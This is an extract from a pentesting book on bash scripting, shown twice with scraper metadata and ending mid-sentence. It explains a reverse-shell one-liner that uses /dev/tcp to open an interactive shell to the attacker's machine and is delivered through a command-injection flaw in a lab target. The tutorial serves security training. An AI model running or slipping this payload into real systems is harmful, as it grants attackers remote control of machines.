# Security Chapter Extract
Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
Chapter: 1 - We’ll submit this line as user input to the target application in the next step.
bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
Listing 7-1: A reverse shell payload
The -i option makes the bash shell interactive, allowing it to receive input and produce output. The /dev/tcp path is a special pseudo-device file in Linux that provides access to TCP sockets. A similar file, /dev/udp, exists for UDP. We add to the filepath the IP address of the Kali machine and the port on which the Kali shell is waiting for incoming connections: /dev/ tcp/172.16.10.1/1337.
The >& syntax combines the standard output (stdout) and standard error (stderr) streams into a single stream. By combining these streams, we ensure that both the regular command outputs and any error messages generated by the reverse shell payload get redirected to our listener.
You may have noticed that we use bash -c to wrap the entire payload in single quotes. This specialized wrapping allows us to explicitly invoke a new instance of the bash shell while specifying a command string to execute with the -c option. It also ensures that the subsequent command is executed using bash, regardless of the default shell set on the target system. You could even specify the bash shell’s full executable path (using /bin/bash -c) to further ensure that the payload executes correctly.
Security Relevance Score: 3
Word Count: 250
Extracted: 2025-06-13 23:40:57

---

We’ll submit this line as user input to the target application in the next step.
bash -c 'bash -i >& /dev/tcp/172.16.10.1/1337 0>&1'
Listing 7-1: A reverse shell payload
The -i option makes the bash shell interactive, allowing it to receive input and produce output. The /dev/tcp path is a special pseudo-device file in Linux that provides access to TCP sockets. A similar file, /dev/udp, exists for UDP. We add to the filepath the IP address of the Kali machine and the port on which the Kali shell is waiting for incoming connections: /dev/ tcp/172.16.10.1/1337.
The >& syntax combines the standard output (stdout) and standard error (stderr) streams into a single stream. By combining these streams, we ensure that both the regular command outputs and any error messages generated by the reverse shell payload get redirected to our listener.
You may have noticed that we use bash -c to wrap the entire payload in single quotes. This specialized wrapping allows us to explicitly invoke a new instance of the bash shell while specifying a command string to execute with the -c option. It also ensures that the subsequent command is executed using bash, regardless of the default shell set on the target system. You could even specify the bash shell’s full executable path (using /bin/bash -c) to further ensure that the payload executes correctly.


Delivering and Initializing the Payload
To deliver the single-line reverse shell payload we created, we’ll exploit the OS command injection vulnerability we identified in p-web-02 (172.16.10.12) in
